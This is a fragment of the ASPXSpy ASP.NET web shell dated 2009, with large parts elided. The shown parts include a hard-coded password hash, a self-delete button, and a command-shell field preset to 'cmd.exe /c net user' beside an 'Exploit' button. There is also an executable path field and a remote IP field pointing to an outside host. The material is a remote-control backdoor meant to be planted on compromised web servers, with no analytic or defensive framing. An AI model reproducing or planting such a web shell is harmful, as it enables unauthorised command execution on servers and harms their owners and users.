...
*/
public string Password="a8e87fc365a8a35a2f5dd1b46ff04e0e";//
public string vbhLn="asdfsf";
public int TdgGU=1;
...
Bin_Button_KillMe.Attributes["onClick"]="if(confirm('Are you sure delete xxoo?')){Bin_PostBack('hae','');};";
...
WICxe();
vIac.Visible=true;
Bin_H2_Title.InnerText="xxommamd xx";
}
...
Copyright &copy; 2009 Bin -- <a href="http://www" target="_blank">wwwn</a>
</div>
<div id="ZVS" runat="server">
<div id="Zzj" runat="server">
<table width="100%" border="0" cellpadding="0" cellspacing="0">
<tr class="head">
<td ><span style="float:right;"><a href="http://aaaanet.cn" target="_blank">ASPXSpy Ver: 2009</a></span><span id="Bin_Span_Sname" runat="server" enableviewstate="true"></span></td>
</tr>
<tr class="alt1">
...
<div runat="server" id="vIac">
 <p>xxxPath:<br/>
 <input class="input" runat="server" id="kusi" type="text" size="100" value="c:\windows\system32\c.exe"/>
 </p>
 cs:<br/>
...
<table width="100%" border="0" cellpadding="4" cellspacing="0" style="margin:10px 0;">
 ...
 <tr >
 <td style="width:10%"></td>
 <td colspan="5">commandShell&nbsp;&nbsp;:&nbsp;<input class="input" runat="server" id="mHbjB" type="text" size="100" value="cmd.exe /c net user"/> <asp:Button ID="SPhc" CssClass="bt" runat="server" Text="Exploit" OnClick="lRfRj"/></td>
 </tr>
</table>
...
<td style="width:20%" align="left">Remote Ip : <input class="input" runat="server" id="llH" type="text" size="20" value="aaaanet.cn"/></td>
...
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">Copyright &copy; 2006-2009  All Rights Reserved.</div></div>
</form>
</body>
</html>